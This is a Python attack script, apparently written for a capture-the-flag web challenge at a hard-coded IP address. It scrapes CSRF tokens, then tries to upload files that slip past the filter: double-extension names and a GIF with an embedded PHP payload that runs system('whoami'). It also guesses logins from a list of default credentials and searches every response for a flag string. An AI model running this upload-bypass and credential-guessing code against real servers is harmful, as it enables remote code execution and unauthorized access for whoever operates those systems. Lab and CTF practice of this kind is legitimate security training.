import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("CSRF分析和上传/登录测试")
print("="*70)

# 1. 获取上传页面的CSRF
print("\n" + "="*70)
print("1. 上传页面CSRF")
print("="*70)

r = session.get(f"{TARGET}/upload", timeout=15)
print(f"状态码: {r.status_code}")
print(f"内容: {r.text}")

# 提取CSRF
csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf = csrf_match.group(1) if csrf_match else ""
print(f"CSRF Token: {csrf}")

# 2. 尝试上传正常GIF
print("\n" + "="*70)
print("2. 上传测试")
print("="*70)

# 正常GIF
gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'

upload_tests = [
    ("test.gif", gif_header, "image/gif", "正常GIF"),
    ("test.jpg", b"\xff\xd8\xff\xe0" + b"JFIF" + b"\x00"*100, "image/jpeg", "正常JPG"),
    ("test.png", b"\x89PNG\r\n\x1a\n" + b"\x00"*100, "image/png", "正常PNG"),
    ("test.gif.php", gif_header, "image/gif", "GIF.php双扩展名"),
    ("test.php.gif", gif_header, "image/gif", "PHP.gif双扩展名"),
    ("test.gif", gif_header + b"<?php system('whoami'); ?>", "image/gif", "GIF嵌入PHP"),
    ("test.gif", gif_header + b"import os; print('test')", "image/gif", "GIF嵌入Python"),
]

for filename, content, content_type, desc in upload_tests:
    try:
        files = {"file": (filename, content, content_type)}
        data = {"csrf": csrf}
        
        r = session.post(f"{TARGET}/upload", files=files, data=data, timeout=15)
        print(f"\n>>> {desc}: {filename}")
        print(f"状态码: {r.status_code}")
        print(f"响应: {r.text[:500]}")
        
        # 搜索flag
        flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
    except Exception as e:
        print(f"错误: {e}")

# 3. 登录CSRF分析
print("\n" + "="*70)
print("3. 登录表单CSRF分析")
print("="*70)

r = session.get(f"{TARGET}/login", timeout=15)
print(f"状态码: {r.status_code}")
print(f"内容: {r.text}")

# 提取所有表单字段
forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL)
for form in forms:
    print(f"\n表单: {form}")

# 提取CSRF
csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf = csrf_match.group(1) if csrf_match else ""
print(f"\n登录CSRF Token: {csrf}")

# 4. 尝试登录
print("\n" + "="*70)
print("4. 登录测试")
print("="*70)

if csrf:
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "term3lab"),
        ("term3lab", "term3lab"),
        ("ctf", "ctf"),
        ("flag", "flag"),
    ]
    
    for username, password in credentials:
        try:
            # 使用同一个session获取新的CSRF
            r = session.get(f"{TARGET}/login", timeout=15)
            csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
            csrf = csrf_match.group(1) if csrf_match else ""
            
            data = {"username": username, "password": password, "csrf": csrf}
            r = session.post(f"{TARGET}/login", data=data, timeout=15, allow_redirects=False)
            
            print(f"\n>>> {username}/{password}")
            print(f"状态码: {r.status_code}")
            print(f"Cookies: {session.cookies.get_dict()}")
            
            # 检查重定向
            if r.status_code in [302, 301]:
                location = r.headers.get('Location', '')
                print(f"重定向到: {location}")
                
                r2 = session.get(f"{TARGET}{location}", timeout=15)
                print(f"重定向页面状态码: {r2.status_code}")
                print(f"内容: {r2.text[:500]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
            else:
                print(f"响应内容: {r.text[:500]}")
                
                # 检查是否登录成功（响应中没有登录表单）
                if "登录" not in r.text[:100]:
                    print(f"⚠️ 可能登录成功!")
                    
                    # 访问控制台
                    r2 = session.get(f"{TARGET}/dashboard", timeout=15)
                    print(f"\n控制台状态码: {r2.status_code}")
                    print(f"内容: {r2.text}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
        except Exception as e:
            print(f"错误: {e}")

# 5. 检查message功能
print("\n" + "="*70)
print("5. Message XSS功能测试")
print("="*70)

r = session.get(f"{TARGET}/message", timeout=15)
print(f"状态码: {r.status_code}")
print(f"内容: {r.text}")

csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf = csrf_match.group(1) if csrf_match else ""

if csrf:
    # 尝试提交包含flag搜索的消息
    data = {"author": "test", "content": "test", "csrf": csrf}
    r = session.post(f"{TARGET}/message", data=data, timeout=15)
    print(f"\n提交消息后:")
    print(f"状态码: {r.status_code}")
    print(f"内容: {r.text[:500]}")
    
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n测试完成")
